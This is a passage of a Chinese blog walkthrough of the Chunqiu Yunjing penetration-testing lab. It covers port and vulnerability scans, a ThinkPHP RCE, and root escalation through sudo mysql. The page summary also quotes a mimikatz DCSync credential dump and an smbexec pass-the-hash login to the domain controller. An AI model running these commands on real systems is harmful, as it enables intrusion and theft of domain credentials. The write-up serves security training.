WIN2016这台域机器被拿下，还剩DC01域控和WIN19-CLIENT，先查一下AD域管理员列表：\nnet group \"domain admins\" /domain 当前机器的用户正好是域管理员，后续通过共享文件夹上传 mimikatz.exe：\nDCSync 获取用户凭证，导出所有用户信息：\nC:\\Users\\Public\\mimikatz.exe\rlsadump::dcsync /domain:xiaorang.lab /all /csv 横向移动到DC域控上：\ncd /usr/share/doc/python3-impacket/examples/ proxychains4 python3 smbexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 administrator@172.22.8.15 flag03.txt：\n参考资料：\nhttps://www.s1mh0.cn/blog/index.php/2024/11/30/cqyj_tsclient/\nhttps://fushuling.com/index.php/2023/08/29/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7tsclient/\n",
  "wordCount" : "5831",
  "inLanguage": "en",
  "datePublished": "2025-10-22T00:00:00Z",
  "dateModified": "2025-10-22T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://z9nn8w.github.io/posts/pentest/cqyj/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "w8nn9z Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://z9nn8w.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/posts" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="https://z9nn8w.github.io/about" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      春秋云境靶场
    </h1>
    <div class="post-meta"><span title='2025-10-22 00:00:00 +0000 UTC'>October 22, 2025</span>

</div>
  </header> <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details >
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#initial" aria-label="Initial">Initial</a></li>
                    <li>
                        <a href="#tsclient" aria-label="Tsclient">Tsclient</a>
                    </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>

  <div class="post-content"><h2 id="initial">Initial<a hidden class="anchor" aria-hidden="true" href="#initial">#</a></h2>
<p>靶机ip:39.99.239.120</p>
<p>nmap扫描开放端口及服务：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ nmap 39.99.239.120 --min-rate <span style="color:#ae81ff">10000</span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-10-22 23:43 CST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 39.99.239.120
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.061s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp open  ssh
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.72 seconds
</span></span></code></pre></div><p>fscan扫描漏洞：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ ./fscan -h 39.99.239.120           
</span></span><span style="display:flex;"><span>┌──────────────────────────────────────────────┐
</span></span><span style="display:flex;"><span>│    ___                              _        │
</span></span><span style="display:flex;"><span>│   / _ <span style="color:#ae81ff">\ </span>    ___  ___ _ __ __ _  ___| | __    │
</span></span><span style="display:flex;"><span>│  / /_<span style="color:#ae81ff">\/</span>____/ __|/ __| <span style="color:#960050;background-color:#1e0010">&#39;</span>__/ _<span style="color:#e6db74">`</span> |/ __| |/ /    │
</span></span><span style="display:flex;"><span>│ / /_<span style="color:#ae81ff">\\</span>_____<span style="color:#ae81ff">\_</span>_ <span style="color:#ae81ff">\ </span><span style="color:#f92672">(</span>__| | | <span style="color:#f92672">(</span>_| | <span style="color:#f92672">(</span>__|   &lt;     │
</span></span><span style="display:flex;"><span>│ <span style="color:#ae81ff">\_</span>___/     |___/<span style="color:#ae81ff">\_</span>__|_|  <span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>__|_|<span style="color:#ae81ff">\_\ </span>   │
</span></span><span style="display:flex;"><span>└──────────────────────────────────────────────┘
</span></span><span style="display:flex;"><span>      Fscan Version: 2.0.1
</span></span><span style="display:flex;"><span>                                                                                                                                                          
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.1s<span style="color:#f92672">]</span>     已选择服务扫描模式                                                                                                                             
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.1s<span style="color:#f92672">]</span>     开始信息扫描
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.1s<span style="color:#f92672">]</span>     最终有效主机数量: <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.1s<span style="color:#f92672">]</span>     开始主机扫描
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.1s<span style="color:#f92672">]</span>     使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle                           
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.1s<span style="color:#f92672">]</span>     有效端口数量: <span style="color:#ae81ff">233</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.2s<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 端口开放 39.99.239.120:80
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1.2s<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 端口开放 39.99.239.120:22
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>4.1s<span style="color:#f92672">]</span>     扫描完成, 发现 <span style="color:#ae81ff">2</span> 个开放端口
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>4.1s<span style="color:#f92672">]</span>     存活端口数量: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>4.1s<span style="color:#f92672">]</span>     开始漏洞扫描
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>4.2s<span style="color:#f92672">]</span>     POC加载完成: 总共387个，成功387个，失败0个
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>4.3s<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 网站标题 http://39.99.239.120      状态码:200 长度:5578   标题:Bootstrap Material Admin
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>9.8s<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 目标: http://39.99.239.120:80
</span></span><span style="display:flex;"><span>  漏洞类型: poc-yaml-thinkphp5023-method-rce                                                                                                              
</span></span><span style="display:flex;"><span>  漏洞名称: poc1                                                                                                                                          
</span></span><span style="display:flex;"><span>  详细信息:                                                                                                                                               
</span></span><span style="display:flex;"><span>        参考链接:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce                                                                         
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>17.2s<span style="color:#f92672">]</span>     扫描已完成: 3/3
</span></span></code></pre></div><p>可以看到web服务存在thinkphp5.0.23-rce的漏洞，利用工具 ThinkphpGUI 直接打：</p>
<p><img alt="alt" loading="lazy" src="/images/CHUNQIUYUNJING/1.png"></p>
<p>蚁剑连上webshell，suid权限的文件没什么可利用的，看看 www-data 用户有什么可以执行的命令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">(</span>www-data:/<span style="color:#f92672">)</span> $ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/usr/bin/umount
</span></span><span style="display:flex;"><span>/usr/bin/newgrp
</span></span><span style="display:flex;"><span>/usr/bin/sudo
</span></span><span style="display:flex;"><span>/usr/bin/su
</span></span><span style="display:flex;"><span>/usr/bin/at
</span></span><span style="display:flex;"><span>/usr/bin/chsh
</span></span><span style="display:flex;"><span>/usr/bin/stapbpf
</span></span><span style="display:flex;"><span>/usr/bin/staprun
</span></span><span style="display:flex;"><span>/usr/bin/chfn
</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
</span></span><span style="display:flex;"><span>/usr/bin/fusermount
</span></span><span style="display:flex;"><span>/usr/bin/passwd
</span></span><span style="display:flex;"><span>/usr/bin/mount
</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>www-data:/<span style="color:#f92672">)</span> $ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on ubuntu-web01:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>User www-data may run the following commands on ubuntu-web01:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/mysql
</span></span></code></pre></div><p>sudo mysql提权：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo mysql -e <span style="color:#e6db74">&#39;\! ls /root&#39;</span>
</span></span><span style="display:flex;"><span>sudo mysql -e <span style="color:#e6db74">&#39;\! ls /root/flag&#39;</span>
</span></span><span style="display:flex;"><span>sudo mysql -e <span style="color:#e6db74">&#39;\! cat /root/flag/flag01.txt&#39;</span>
</span></span></code></pre></div><p>flag01.txt：</p>
<pre tabindex="0"><code>(www-data:/) $ sudo mysql -e &#39;\! cat /root/flag/flag01.txt&#39;
 ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████ 
░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██
 ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░ 
  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██         
   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████
  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██
 ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████ 
░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░  
Congratulations!!! You found the first flag, the next flag may be in a server in the internal network.
flag01: flag{60b53231-
</code></pre><p>后续打内网，先用蚁剑上传 <code>fscan</code> 到 <code>/tmp</code> 目录下，查一下ip网段：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">(</span>www-data:/tmp<span style="color:#f92672">)</span> $ ip addr
</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>    inet6 ::1/128 scope host 
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span><span style="display:flex;"><span>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">1500</span> qdisc mq state UP group default qlen <span style="color:#ae81ff">1000</span>
</span></span><span style="display:flex;"><span>    link/ether 00:16:3e:05:d1:5c brd ff:ff:ff:ff:ff:ff
</span></span><span style="display:flex;"><span>    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0
</span></span><span style="display:flex;"><span>       valid_lft 1892158414sec preferred_lft 1892158414sec
</span></span><span style="display:flex;"><span>    inet6 fe80::216:3eff:fe05:d15c/64 scope link 
</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p>先给可执行权限，fscan 扫描后的结果会保存在当前目录下的 <code>result.txt</code> 中：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">(</span>www-data:/tmp<span style="color:#f92672">)</span> $ chmod u+x fscan
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>www-data:/tmp<span style="color:#f92672">)</span> $ ./fscan -h 172.22.1.0/24
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>www-data:/tmp<span style="color:#f92672">)</span> $ cat result.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:58:56<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>HOST<span style="color:#f92672">]</span> 目标:172.22.1.15 状态:alive 详情:protocol<span style="color:#f92672">=</span>ICMP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:58:56<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>HOST<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:alive 详情:protocol<span style="color:#f92672">=</span>ICMP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:58:57<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>HOST<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:alive 详情:protocol<span style="color:#f92672">=</span>ICMP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:58:57<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>HOST<span style="color:#f92672">]</span> 目标:172.22.1.21 状态:alive 详情:protocol<span style="color:#f92672">=</span>ICMP
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.15 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.15 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">22</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">135</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">445</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">139</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">445</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">389</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">139</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">135</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">88</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.21 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">139</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.21 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">135</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.21 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">445</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:01<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PORT<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:open 详情:port<span style="color:#f92672">=</span><span style="color:#ae81ff">3306</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.21 状态:identified 详情:hostname<span style="color:#f92672">=</span>XIAORANG-WIN7, ipv4<span style="color:#f92672">=[</span>172.22.1.21<span style="color:#f92672">]</span>, ipv6<span style="color:#f92672">=[]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>VULN<span style="color:#f92672">]</span> 目标:172.22.1.21 状态:vulnerable 详情:port<span style="color:#f92672">=</span>445, vulnerability<span style="color:#f92672">=</span>MS17-010, os<span style="color:#f92672">=</span>Windows Server <span style="color:#ae81ff">2008</span> R2 Enterprise <span style="color:#ae81ff">7601</span> Service Pack <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:identified 详情:port<span style="color:#f92672">=</span>445, service<span style="color:#f92672">=</span>smb, os<span style="color:#f92672">=</span>Windows Server <span style="color:#ae81ff">2016</span> Datacenter <span style="color:#ae81ff">14393</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:identified 详情:domain_name<span style="color:#f92672">=</span>xiaorang.lab, server_service<span style="color:#f92672">=</span>DC01, port<span style="color:#f92672">=</span>139, computer_name<span style="color:#f92672">=</span>DC01.xiaorang.lab, netbios_domain<span style="color:#f92672">=</span>XIAORANG, netbios_computer<span style="color:#f92672">=</span>DC01, workstation_service<span style="color:#f92672">=</span>DC01, domain_controllers<span style="color:#f92672">=</span>XIAORANG, os_version<span style="color:#f92672">=</span>Windows Server <span style="color:#ae81ff">2016</span> Datacenter <span style="color:#ae81ff">14393</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.2 状态:identified 详情:hostname<span style="color:#f92672">=</span>DC01, ipv4<span style="color:#f92672">=[</span>172.22.1.2<span style="color:#f92672">]</span>, ipv6<span style="color:#f92672">=[]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:identified 详情:hostname<span style="color:#f92672">=</span>XIAORANG-OA01, ipv4<span style="color:#f92672">=[</span>172.22.1.18<span style="color:#f92672">]</span>, ipv6<span style="color:#f92672">=[]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.15 状态:identified 详情:title<span style="color:#f92672">=</span>Bootstrap Material Admin, Url<span style="color:#f92672">=</span>http://172.22.1.15, status_code<span style="color:#f92672">=</span>200, length<span style="color:#f92672">=</span>5578, server_info<span style="color:#f92672">=</span>map<span style="color:#f92672">[</span>content-type:text/html; charset<span style="color:#f92672">=</span>utf-8 date:Wed, <span style="color:#ae81ff">22</span> Oct <span style="color:#ae81ff">2025</span> 15:59:04 GMT length:5578 server:Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> status_code:200 title:Bootstrap Material Admin vary:Accept-Encoding<span style="color:#f92672">]</span>, fingerprints<span style="color:#f92672">=[]</span>, port<span style="color:#f92672">=</span>80, service<span style="color:#f92672">=</span>http
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.18 状态:identified 详情:workstation_service<span style="color:#f92672">=</span>XIAORANG-OA01, server_service<span style="color:#f92672">=</span>XIAORANG-OA01, os_version<span style="color:#f92672">=</span>Windows Server <span style="color:#ae81ff">2012</span> R2 Datacenter 9600, port<span style="color:#f92672">=</span>139, computer_name<span style="color:#f92672">=</span>XIAORANG-OA01.xiaorang.lab, domain_name<span style="color:#f92672">=</span>xiaorang.lab, netbios_domain<span style="color:#f92672">=</span>XIAORANG, netbios_computer<span style="color:#f92672">=</span>XIAORANG-OA01
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>2025-10-22 23:59:04<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>SERVICE<span style="color:#f92672">]</span> 目标:172.22.1.21 状态:identified 详情:netbios_computer<span style="color:#f92672">=</span>XIAORANG-WIN7, workstation_service<span style="color:#f92672">=</span>XIAORANG-WIN7, server_service<span style="color:#f92672">=</span>XIAORANG-WIN7, os_version<span style="color:#f92672">=</span>Windows Server <span style="color:#ae81ff">2008</span> R2 Enterprise <span style="color:#ae81ff">7601</span> Service Pack 1, port<span style="color:#f92672">=</span>139, computer_name<span style="color:#f92672">=</span>XIAORANG-WIN7.xiaorang.lab, domain_name<span style="color:#f92672">=</span>xiaorang.lab, netbios_domain<span style="color:#f92672">=</span>XIAORANG
